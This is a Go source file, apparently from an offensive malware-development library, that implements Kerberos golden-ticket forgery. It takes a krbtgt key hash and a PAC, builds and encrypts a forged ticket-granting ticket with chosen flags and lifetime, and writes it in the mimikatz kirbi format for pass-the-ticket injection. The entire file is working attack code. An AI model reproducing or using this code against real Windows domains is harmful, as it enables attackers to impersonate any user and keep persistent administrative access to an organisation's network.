package goldenticket

import (
	"fmt"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/oioio-space/maldev/internal/krb5/asn1tools"
	"github.com/oioio-space/maldev/internal/krb5/crypto"
	"github.com/oioio-space/maldev/internal/krb5/iana"
	"github.com/oioio-space/maldev/internal/krb5/iana/adtype"
	"github.com/oioio-space/maldev/internal/krb5/iana/asnAppTag"
	"github.com/oioio-space/maldev/internal/krb5/iana/etypeID"
	"github.com/oioio-space/maldev/internal/krb5/iana/keyusage"
	"github.com/oioio-space/maldev/internal/krb5/iana/msgtype"
	"github.com/oioio-space/maldev/internal/krb5/iana/nametype"
	"github.com/oioio-space/maldev/internal/krb5/messages"
	"github.com/oioio-space/maldev/internal/krb5/types"
)

// buildKirbi wraps a finished PAC into a Kerberos ticket and serialises
// it as a kirbi (KRB-CRED ASN.1) byte stream — the same format mimikatz
// `kerberos::golden /ticket:foo.kirbi` writes, directly loadable by
// `kerberos::ptt` or by goldenticket.Submit on Windows.
//
// Steps:
//
//  1. Wrap the PAC in an AD-IF-RELEVANT envelope of one
//     AD-WIN2K-PAC entry; that goes into EncTicketPart.AuthorizationData.
//  2. Build EncTicketPart with the chosen flags (forwardable +
//     renewable + initial + pre-authent), a freshly-generated session
//     key matching the krbtgt etype, and the cname / sname / times /
//     realm derived from Params.
//  3. ASN.1-marshal the EncTicketPart with the EncTicketPart app tag.
//  4. Encrypt with the krbtgt long-term key (key usage
//     KDC_REP_TICKET = 2). Result becomes Ticket.EncPart.
//  5. Build the outer Ticket{TktVNO=5, Realm, SName=krbtgt/<DOMAIN>,
//     EncPart}.
//  6. Build EncKrbCredPart{TicketInfo=[KrbCredInfo{...}]} with the
//     ticket metadata copies needed by the LSA submitter.
//  7. ASN.1-marshal the EncKrbCredPart with its app tag.
//     (Kirbi files conventionally store the EncPart as etype-0
//     "plaintext" — kerberos::ptt and the LSA submitter both accept
//     this. We follow the same convention.)
//  8. Build the outer KRBCred + ASN.1-marshal with the KRB-CRED app
//     tag — that's the kirbi byte stream returned to the caller.
func buildKirbi(p normalizedParams, pacBytes []byte) ([]byte, error) {
	// Step 1: wrap PAC in AD-IF-RELEVANT envelope.
	adData, err := wrapPACAsAuthData(pacBytes)
	if err != nil {
		return nil, fmt.Errorf("wrap PAC: %w", err)
	}

	// Step 2: build EncTicketPart.
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, p.User)
	sname := buildSName(p.PrincipalName)

	etypeForKey := keyEType(p.Hash.Type)
	et, err := crypto.GetEtype(etypeForKey)
	if err != nil {
		return nil, fmt.Errorf("get etype %d: %w", etypeForKey, err)
	}
	sessionKey, err := types.GenerateEncryptionKey(et)
	if err != nil {
		return nil, fmt.Errorf("generate session key: %w", err)
	}

	endTime := p.Now.Add(p.Lifetime)
	etp := messages.EncTicketPart{
		Flags:             ticketFlags(),
		Key:               sessionKey,
		CRealm:            p.Domain,
		CName:             cname,
		Transited:         messages.TransitedEncoding{},
		AuthTime:          p.Now,
		StartTime:         p.Now,
		EndTime:           endTime,
		RenewTill:         endTime,
		AuthorizationData: adData,
	}

	// Step 3: marshal + add EncTicketPart app tag.
	etpBytes, err := asn1.Marshal(etp)
	if err != nil {
		return nil, fmt.Errorf("marshal EncTicketPart: %w", err)
	}
	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)

	// Step 4: encrypt with krbtgt key.
	krbtgtKey := types.EncryptionKey{
		KeyType:  etypeForKey,
		KeyValue: p.Hash.Bytes,
	}
	encPart, err := crypto.GetEncryptedData(etpBytes, krbtgtKey, keyusage.KDC_REP_TICKET, 0)
	if err != nil {
		return nil, fmt.Errorf("encrypt EncTicketPart: %w", err)
	}

	// Step 5: outer Ticket.
	tkt := messages.Ticket{
		TktVNO:  iana.PVNO,
		Realm:   p.Domain,
		SName:   sname,
		EncPart: encPart,
	}

	// Step 6: KrbCredInfo + EncKrbCredPart.
	credInfo := messages.KrbCredInfo{
		Key:       sessionKey,
		PRealm:    p.Domain,
		PName:     cname,
		Flags:     ticketFlags(),
		AuthTime:  p.Now,
		StartTime: p.Now,
		EndTime:   endTime,
		RenewTill: endTime,
		SRealm:    p.Domain,
		SName:     sname,
	}
	encCredPart := messages.EncKrbCredPart{
		TicketInfo: []messages.KrbCredInfo{credInfo},
	}

	// Step 7: marshal + add EncKrbCredPart app tag.
	encCredBytes, err := asn1.Marshal(encCredPart)
	if err != nil {
		return nil, fmt.Errorf("marshal EncKrbCredPart: %w", err)
	}
	encCredBytes = asn1tools.AddASNAppTag(encCredBytes, asnAppTag.EncKrbCredPart)

	// Step 8: outer KRBCred. EncPart carries the unencrypted
	// EncKrbCredPart with etype=0 — the kirbi-on-disk convention used
	// by mimikatz, accepted by kerberos::ptt and LsaCallAuthentication
	// Package(SubmitTicket).
	cred := messages.KRBCred{
		PVNO:    iana.PVNO,
		MsgType: msgtype.KRB_CRED,
		Tickets: []messages.Ticket{tkt},
		EncPart: types.EncryptedData{
			EType:  0,
			Cipher: encCredBytes,
		},
	}

	// Marshal the ticket sequence using upstream's helper — it
	// produces the (Class=2, IsCompound=true, Bytes=SEQUENCE-TLV)
	// RawValue shape the KRB-CRED [2] EXPLICIT field expects.
	ticketsRaw, err := messages.MarshalTicketSequence(cred.Tickets)
	if err != nil {
		return nil, fmt.Errorf("marshal tickets sequence: %w", err)
	}

	// Mirror the upstream-private marshalKRBCred shape (gokrb5 only
	// exposes Unmarshal). Same field tags as the upstream type.
	type marshalKRBCred struct {
		PVNO    int                 `asn1:"explicit,tag:0"`
		MsgType int                 `asn1:"explicit,tag:1"`
		Tickets asn1.RawValue       `asn1:"explicit,tag:2"`
		EncPart types.EncryptedData `asn1:"explicit,tag:3"`
	}
	m := marshalKRBCred{
		PVNO:    cred.PVNO,
		MsgType: cred.MsgType,
		Tickets: ticketsRaw,
		EncPart: cred.EncPart,
	}
	credBytes, err := asn1.Marshal(m)
	if err != nil {
		return nil, fmt.Errorf("marshal KRBCred: %w", err)
	}
	return asn1tools.AddASNAppTag(credBytes, asnAppTag.KRBCred), nil
}

// wrapPACAsAuthData produces the AuthorizationData slice that goes
// into EncTicketPart.AuthorizationData. The shape is:
//
//	[ AD_IF_RELEVANT, marshal([ AD_WIN2K_PAC, pacBytes ]) ]
//
// AD_IF_RELEVANT (1) tells receivers that don't recognize the inner
// type that they MAY ignore it; AD_WIN2K_PAC (128) is the type that
// carries the PAC blob.
func wrapPACAsAuthData(pacBytes []byte) (types.AuthorizationData, error) {
	innerEntry := types.AuthorizationDataEntry{
		ADType: adtype.ADWin2KPAC,
		ADData: pacBytes,
	}
	innerSeq := types.AuthorizationData{innerEntry}
	innerBytes, err := asn1.Marshal(innerSeq)
	if err != nil {
		return nil, fmt.Errorf("marshal inner AD-WIN2K-PAC: %w", err)
	}
	return types.AuthorizationData{
		{
			ADType: adtype.ADIfRelevant,
			ADData: innerBytes,
		},
	}, nil
}

// buildSName splits a "krbtgt/CORP.EXAMPLE.COM" SPN into a
// PrincipalName{Type: KRB_NT_SRV_INST, NameString: ["krbtgt",
// "CORP.EXAMPLE.COM"]}. Defaults to KRB_NT_PRINCIPAL when the SPN has
// no slash.
func buildSName(spn string) types.PrincipalName {
	parts := splitSPN(spn)
	t := nametype.KRB_NT_SRV_INST
	if len(parts) == 1 {
		t = nametype.KRB_NT_PRINCIPAL
	}
	return types.PrincipalName{
		NameType:   t,
		NameString: parts,
	}
}

// splitSPN splits on the first '/' only — anything past the first
// slash is the realm component (which can contain dots).
func splitSPN(spn string) []string {
	for i := 0; i < len(spn); i++ {
		if spn[i] == '/' {
			return []string{spn[:i], spn[i+1:]}
		}
	}
	return []string{spn}
}

// keyEType maps our public EType to the IANA etype IDs gokrb5
// expects.
func keyEType(et EType) int32 {
	switch et {
	case ETypeRC4HMAC:
		return etypeID.RC4_HMAC
	case ETypeAES128CTS:
		return etypeID.AES128_CTS_HMAC_SHA1_96
	case ETypeAES256CTS:
		return etypeID.AES256_CTS_HMAC_SHA1_96
	default:
		return 0
	}
}

// ticketFlags returns the BIT STRING used in EncTicketPart.Flags and
// KrbCredInfo.Flags. Sets forwardable + renewable + initial + pre-
// authent — same defaults mimikatz uses for kerberos::golden.
//
// Bit numbering follows MIT-style "bit 0 == leftmost"; the gokrb5
// flags package indexes them from the constant table. We pre-compute
// a 32-bit big-endian word with the four bits set and wrap it in an
// asn1.BitString.
func ticketFlags() asn1.BitString {
	const (
		bitForwardable = 1
		bitRenewable   = 8
		bitInitial     = 9
		bitPreAuthent  = 10
	)
	var v uint32
	for _, b := range []uint{bitForwardable, bitRenewable, bitInitial, bitPreAuthent} {
		v |= 1 << (31 - b)
	}
	return asn1.BitString{
		Bytes: []byte{
			byte(v >> 24),
			byte(v >> 16),
			byte(v >> 8),
			byte(v),
		},
		BitLength: 32,
	}
}

